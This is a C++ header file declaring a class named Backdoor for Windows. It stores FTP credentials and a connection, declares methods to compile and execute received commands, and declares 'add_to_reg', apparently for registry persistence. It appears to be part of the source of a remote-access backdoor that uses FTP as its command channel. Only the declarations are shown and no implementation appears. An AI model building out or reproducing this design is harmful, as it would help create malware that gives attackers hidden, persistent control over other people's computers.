#pragma once

#include "FtpConnect.h"
#include "WinWrapper.h"
#include <exception>

class Backdoor
{

public:
	Backdoor(const std::string& host, const std::string& username, const std::string& password);
	~Backdoor();

	void start();

private:
	void setup();

	void compile(const std::string &file_path);
	void execute(const std::vector<std::string>& spl_line);

	void add_to_reg();


private:
	std::string ftp_host;
	std::string ftp_username;
	std::string ftp_password;

	FtpConnect ftp_connection;

	std::string win_username;
	std::string store_path;
	std::string data_path;
	std::string app_path;
	std::string output_path;

};